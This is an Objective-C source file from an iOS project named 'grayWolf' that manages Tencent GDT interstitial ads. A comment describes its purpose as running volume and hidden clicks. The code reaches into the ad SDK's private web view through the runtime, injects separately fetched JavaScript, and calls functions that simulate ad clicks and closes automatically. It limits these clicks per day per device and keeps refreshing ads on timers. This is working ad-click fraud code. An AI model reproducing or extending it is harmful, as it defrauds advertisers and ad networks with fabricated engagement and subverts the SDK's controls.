//
//  GDTCpManager.m
//  grayWolf
//
//  Created by zengbiwang on 2017/6/27.
//
//

#import "GDTInterstitialManager.h"
#import "GDTMobInterstitial.h"
#import "MajorSystemConfig.h"
#import "IQUIWindow+Hierarchy.h"
#import "CSPausibleTimer.h"
#import "AppDevice.h"
#import "GDtInterstitialRootCtrl.h"
#import "helpFuntion.h"
#import "GDTInterstitialManager.h"
#import "JsServiceManager.h"
#import "FTWCache.h"
#import <objc/runtime.h>
//跑量和隐藏点击

_GDTClickState _click_Interstitial_State = GDT_CLICK_unVaild;
static GDTInterstitialManager *g = NULL;
@interface GDTInterstitialManager()<GDTMobInterstitialDelegate>{
    GDTMobInterstitial *_interstitialObj;
    BOOL _isAutoRefreshMode;
    BOOL _isCreateMaskView;
    BOOL _isClickBanner;
    BOOL _autoClick;
    
    BOOL _isExctShow;
    BOOL _isPostNotitifiAdvertGdtManagerChangeID;
    BOOL _isReviceCheckNotifi;
    BOOL _isInterstitialWillExposure;
    BOOL _isClickInWillExposure;
}
@property(assign)BOOL isDelayClickState;//是否延迟加载的状态
@property(retain)CSPausibleTimer *maxClickOverTime;
@property(retain)CSPausibleTimer *chaoshiTimer;
@property(retain)CSPausibleTimer *updateTimer;//自动刷新
@property(retain)NSArray *_data;             //原生广告数据数组
@property(assign)UIViewController *rootCtrl;
@end
@implementation GDTInterstitialManager

+(GDTInterstitialManager*)getInstance{
    //return NULL;
    if (!g) {
        g = [[GDTInterstitialManager alloc]init];
        if([MajorSystemConfig getInstance].appUserDebugAdID)
        {
          
            [MajorSystemConfig getInstance].gdtInterstitialAdInfo = [NSDictionary dictionaryWithObjectsAndKeys:@"1106553721",@"appkey",@"4000320828588698",@"placementId", nil];
        }
        
    }
    return g;
}

+(void)destoryInstance{
    [g unAllAsset];
    [g release];
    g = NULL;
}

-(void)unAllAsset{
    [[NSNotificationCenter defaultCenter]removeObserver:self];
    [((GDtRootCtrl*)[MajorSystemConfig getInstance].gdtInterstitialRootCtrl) startOrStopCheck:false];
    [self.updateTimer invalidate];self.updateTimer = nil;
    [self.chaoshiTimer invalidate];self.chaoshiTimer = nil;
    [self.maxClickOverTime invalidate];self.maxClickOverTime = nil;
    [self stopAutoRefreshTimer];
}

-(id)init{
    self = [super init];
    self.isDelayClickState = false;
    self.cpState = GDT_CpManager_FirstRequest;
    if ([MajorSystemConfig getInstance].isParallelClick) {
        [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(checkInterstitialState) name:@"CheckInterstitialState" object:nil];
    }
    return self;
}

-(void)checkInterstitialState{
    if (_isReviceCheckNotifi) {
        return;
    }
    _isReviceCheckNotifi = true;
    [self checkIt];
}

-(void)checkIt{
    printf("inter checkit\n");
    BOOL ret = false;
    if((![[AdvertGdtInterstitialManager getInstance] isCanAutoShow] ) || (!_isAutoRefreshMode && [MajorSystemConfig getInstance].is_qq_Apl && !_isCreateMaskView && ![[helpFuntion gethelpFuntion]isValideOneDayNotAutoAdd:eveyrDayClickGDTAdertTimes(([NSString stringWithFormat:@"%@%@",[[MajorSystemConfig getInstance].gdtInterstitialAdInfo objectForKey:@"placementId"],[AppDevice getInstance].deviceUID])) nCount:[MajorSystemConfig getInstance].everyGDTDayTime isUseYYCache:false time:nil]))
    {
        _isCreateMaskView = true;
    }
    if (_interstitialObj && [MajorSystemConfig getInstance].is_qq_Apl && !_isCreateMaskView) {
        ret = true;
    }
    if(!ret)//本次启动已经自动点击，执行自动刷新广告
    {
        [self maxClickOvertDelay];
        _isAutoRefreshMode = true;
        self.cpState = GDT_CpManager_AutoUpdate;
        if(!self.updateTimer){
            self.updateTimer = [CSPausibleTimer scheduledTimerWithTimeInterval:[MajorSystemConfig getInstance].gdtUpdateNativeTime target:self selector:@selector(autoUpdateTimeFun) userInfo:nil repeats:YES];
        }
    }
    else{//超时处理
        self.cpState = GDT_CpManager_FirstRequest;
        if (_isInterstitialWillExposure) {
            [self checkIt2];
        }
        else{
            _isClickInWillExposure = true;
            [self showGDTCp:nil rootCtrl:nil];
        }
        if(!self.chaoshiTimer){
            self.chaoshiTimer = [CSPausibleTimer scheduledTimerWithTimeInterval:[MajorSystemConfig getInstance].gdtClickOvertime target:self selector:@selector(clickOvertime) userInfo:nil repeats:NO];
        }
    }

}

-(void)checkIt2{
    if([UIApplication sharedApplication].applicationState != UIApplicationStateActive)
        return;
    
    NSString *jsContent = [[JsServiceManager getInstance] getJsContent:GdtAdOperatJsKey];
    if(jsContent && (self.cpState != GDT_CpManager_AutoClickFaild) && (( !_isAutoRefreshMode && !_isClickBanner && [MajorSystemConfig getInstance].is_qq_Apl && !_isCreateMaskView) && [[AdvertGdtInterstitialManager getInstance] isCanAutoShow])){
        _isCreateMaskView = true;
        [[AdvertGdtInterstitialManager getInstance]initClickInfo];
        [[helpFuntion gethelpFuntion]isValideOneDay:eveyrDayClickGDTAdertTimes(([NSString stringWithFormat:@"%@%@",[[MajorSystemConfig getInstance].gdtInterstitialAdInfo objectForKey:@"placementId"],[AppDevice getInstance].deviceUID])) nCount:[MajorSystemConfig getInstance].everyGDTDayTime isUseYYCache:false time:nil];
        if ([NSThread mainThread]) {
            [self performSelector:@selector(randomClick) withObject:nil afterDelay:1];
        }
        else{
            dispatch_async(dispatch_get_main_queue(), ^{
                [self performSelector:@selector(randomClick) withObject:nil afterDelay:1];
            });
        }
    }
}

-(void)startAutoRefreshTimer{
    [NSObject cancelPreviousPerformRequestsWithTarget:self selector:@selector(randomClick) object:nil];
    [NSObject cancelPreviousPerformRequestsWithTarget:self selector:@selector(delayShow) object:nil];
    NSString *appKey = [[MajorSystemConfig getInstance].gdtInterstitialAdInfo objectForKey:@"appkey"];
    NSString *placementId = [[MajorSystemConfig getInstance].gdtInterstitialAdInfo objectForKey:@"placementId"];
    if (appKey&&placementId && !_interstitialObj && self.rootCtrl) {
        _isAutoRefreshMode = true;
        [self addGDT:self.rootCtrl.view currentCtrl:self.rootCtrl appkey:appKey placementId:placementId];
    }
}

-(void)stopAutoRefreshTimer{
    _isAutoRefreshMode = false;
    [NSObject cancelPreviousPerformRequestsWithTarget:self selector:@selector(randomClick) object:nil];
    [NSObject cancelPreviousPerformRequestsWithTarget:self selector:@selector(delayShow) object:nil];
    [_interstitialObj release];
    _interstitialObj = nil;
}


-(void)addGDT:(UIView*)parentView currentCtrl:(UIViewController*)currentViwController appkey:(NSString*)appKey placementId:(NSString*)placementId{
    [NSObject cancelPreviousPerformRequestsWithTarget:self selector:@selector(randomClick) object:nil];
    [NSObject cancelPreviousPerformRequestsWithTarget:self selector:@selector(delayShow) object:nil];
    _isExctShow = false;
    [_interstitialObj release];
    _interstitialObj = nil;
    _autoClick = false;
    _interstitialObj = [[GDTMobInterstitial alloc] initWithAppId:appKey placementId:placementId];
    _interstitialObj.delegate = self;
    _interstitialObj.isGpsOn = false;
    [_interstitialObj loadAd];
}

-(void)delayShow
{
    if (_interstitialObj.isReady && _interstitialObj && !_isExctShow) {
        _isExctShow = true;
        [((GDtRootCtrl*)[MajorSystemConfig getInstance].gdtInterstitialRootCtrl) startOrStopCheck:false];
        [_interstitialObj presentFromRootViewController:((GDtRootCtrl*)[MajorSystemConfig getInstance].gdtInterstitialRootCtrl)];
    }
}

- (void)interstitialFailToLoadAd:(GDTMobInterstitial *)interstitial error:(NSError *)error{
    printf("interstitialFailToLoadAd\n");
    _isInterstitialWillExposure = false;
}

- (void)interstitialWillExposure:(GDTMobInterstitial *)interstitial{
    _isInterstitialWillExposure = true;
    if (_isClickInWillExposure) {
        [self checkIt2];
    }
}

-(BOOL)showGDTCp:(UIView**)outView rootCtrl:(UIViewController*)rootCtrl{
    BOOL ret = false;//appkey placementId:placementId]
    NSString *appKey = [[MajorSystemConfig getInstance].gdtInterstitialAdInfo objectForKey:@"appkey"];
    NSString *placementId = [[MajorSystemConfig getInstance].gdtInterstitialAdInfo objectForKey:@"placementId"];
    [self stopAutoRefreshTimer];
    [self.updateTimer invalidate];self.updateTimer = nil;
    [self.chaoshiTimer invalidate];self.chaoshiTimer = nil;
    if (!appKey) {
        [self maxClickOvertDelay];
        return false;
    }
    if (appKey&&placementId && !_interstitialObj) {
        self.rootCtrl = rootCtrl;
        _isAutoRefreshMode = false;
        [self addGDT:self.rootCtrl.view currentCtrl:[[UIApplication sharedApplication] keyWindow].rootViewController appkey:appKey placementId:placementId];
    }
    else{
        [MajorSystemConfig getInstance].is_qq_Apl = false;
    }
    //
    return ret;
}

-(void)clickOvertime
{
    NSLog(@"clickOvertTimer Interstitial");
    [NSObject cancelPreviousPerformRequestsWithTarget:self selector:@selector(randomClick) object:nil];
    [NSObject cancelPreviousPerformRequestsWithTarget:self selector:@selector(delayShow) object:nil];
    self.cpState = GDT_CpManager_AutoClickFaild;
    [self.chaoshiTimer invalidate];self.chaoshiTimer = nil;
    [self autoUpdateTimeFun];
    if(!self.updateTimer){
        self.updateTimer = [CSPausibleTimer scheduledTimerWithTimeInterval:[MajorSystemConfig getInstance].gdtUpdateNativeTime target:self selector:@selector(autoUpdateTimeFun) userInfo:nil repeats:YES];
    }
    [[NSNotificationCenter defaultCenter]postNotificationName:@"gdt_chaoshiNotifi" object:nil];
    [self maxClickOvertDelay];
}

-(void)autoUpdateTimeFun{
    NSString *appKey = [[MajorSystemConfig getInstance].gdtInterstitialAdInfo objectForKey:@"appkey"];
    NSString *placementId = [[MajorSystemConfig getInstance].gdtInterstitialAdInfo objectForKey:@"placementId"];
    [self addGDT:self.rootCtrl.view currentCtrl:[[UIApplication sharedApplication] keyWindow].rootViewController appkey:appKey placementId:placementId];
}

-(void)stopGDTAndRemove{
    
}

-(void)stopIfisClick{
    if(_isAutoRefreshMode)return;
    [_interstitialObj release];_interstitialObj = nil;
    [self startAutoRefreshTimer];
}

-(void)addJustBanner{
    
}

-(void)maxClickOvertDelay
{
    [self.maxClickOverTime invalidate];
    self.maxClickOverTime = nil;
    if(!_isPostNotitifiAdvertGdtManagerChangeID){
        NotitifiAdvertGdtManagerChangeID//直接通知切换
        _isPostNotitifiAdvertGdtManagerChangeID = true;
    }
}

-(void)randomClick{
    printf("InterstitialRandomClick %s\n",[[[MajorSystemConfig getInstance].gdtInterstitialAdInfo objectForKey:@"placementId"] UTF8String]);
    //[MobClick event:@"InterstitialRandomClick"];
    if (!self.maxClickOverTime) {//防止点击出错无法切换ID
        self.maxClickOverTime = [CSPausibleTimer scheduledTimerWithTimeInterval:15 target:self selector:@selector(maxClickOvertDelay) userInfo:nil repeats:NO];
    }
    if (![MajorSystemConfig getInstance].isDebugMode) {
        [self.chaoshiTimer resumeTimer];
        [self.updateTimer resumeTimer];
        if(!_isAutoRefreshMode && [MajorSystemConfig getInstance].is_qq_Apl){
                 _click_Interstitial_State = GDT_CLICK_Vaild;
            [self.chaoshiTimer invalidate];self.chaoshiTimer = nil;
            self.cpState = GDT_CpManager_AutoClickSuccess;
            
            NSString *jsContent = [[JsServiceManager getInstance] getJsContent:GdtAdOperatJsKey];
            Ivar iVar = class_getInstanceVariable([_interstitialObj class], "_webView");
            if (!iVar) {
                return;
            }
            UIWebView * v = object_getIvar(_interstitialObj, iVar);
            if (v) {
                [v stringByEvaluatingJavaScriptFromString:jsContent];
                [v stringByEvaluatingJavaScriptFromString:@"clickInterstitial()"];
                _autoClick = true;
            }
        }
    }
}

- (void)interstitialClicked:(GDTMobInterstitial *)interstitial//自动关闭这里
{
    //[MobClick event:@"InterstitialClicked"];
    printf("InterstitialClicked = %s\n",[[[MajorSystemConfig getInstance].gdtInterstitialAdInfo objectForKey:@"placementId"] UTF8String]);
    if(_autoClick)
    {
        [self.chaoshiTimer invalidate];self.chaoshiTimer = nil;
        dispatch_async(dispatch_get_main_queue(), ^{
            [self performSelector:@selector(delayClose) withObject:nil afterDelay:[MajorSystemConfig getInstance].gdtDelayDisplayTime/2.0];
        });
    }
    _autoClick=false;
}

-(void)delayClose{
    printf("interstitialDelayClose\n");
    if (_interstitialObj) {
        Ivar iVar = class_getInstanceVariable([_interstitialObj class], "_webView");
        if (!iVar) {
            return;
        }
        UIWebView * v = object_getIvar(_interstitialObj, iVar);
        if (v) {
            NSString *jsContent = [[JsServiceManager getInstance] getJsContent:GdtAdOperatJsKey];
            [v stringByEvaluatingJavaScriptFromString:jsContent];
            [v stringByEvaluatingJavaScriptFromString:@"triggerCloseInterstitial()"];
        }
    }
}

- (void)interstitialDidDismissScreen:(GDTMobInterstitial *)interstitial
{
    printf("interstitialDidDismissScreen\n");
    //[MobClick event:@"interstitialDidDismissScreen"];
    [((GDtRootCtrl*)[MajorSystemConfig getInstance].gdtInterstitialRootCtrl) startOrStopCheck:true];
    if(self.cpState == GDT_CpManager_AutoClickSuccess){
        [[NSNotificationCenter defaultCenter]postNotificationName:@"gdt_chaoshiNotifi" object:nil];
        //开始自动刷新
        self.cpState = GDT_CpManager_AutoUpdate;
        //[self autoUpdateTimeFun];
        if(!self.updateTimer){
            self.updateTimer = [CSPausibleTimer scheduledTimerWithTimeInterval:[MajorSystemConfig getInstance].gdtUpdateNativeTime target:self selector:@selector(autoUpdateTimeFun) userInfo:nil repeats:YES];
        }
    }
    _click_Interstitial_State = GDT_CLICK_unVaild;
    [self maxClickOvertDelay];
}

- (void)interstitialSuccessToLoadAd:(GDTMobInterstitial *)interstitial
{
    //[MobClick event:@"interstitialSuccessToLoadAd"];
    [self delayShow];
    printf("interstitialSuccessToLoadAd = %s\n",[[[MajorSystemConfig getInstance].gdtInterstitialAdInfo objectForKey:@"placementId"] UTF8String]);
}

- (void)interstitialApplicationWillEnterBackground:(GDTMobInterstitial *)interstitial{
    printf("interstitialApplicationWillEnterBackground\n");
    if(self.cpState == GDT_CpManager_AutoClickSuccess){
        self.cpState = GDT_CpManager_AutoUpdate;
        [self autoUpdateTimeFun];
        [[NSNotificationCenter defaultCenter]postNotificationName:@"gdt_chaoshiNotifi" object:nil];
        if(!self.updateTimer){
            self.updateTimer = [CSPausibleTimer scheduledTimerWithTimeInterval:[MajorSystemConfig getInstance].gdtUpdateNativeTime target:self selector:@selector(autoUpdateTimeFun) userInfo:nil repeats:YES];
        }
    }
    [self.maxClickOverTime invalidate];self.maxClickOverTime = nil;
    _click_Interstitial_State = GDT_CLICK_unVaild;
    [self maxClickOvertDelay];
}
//end

@end





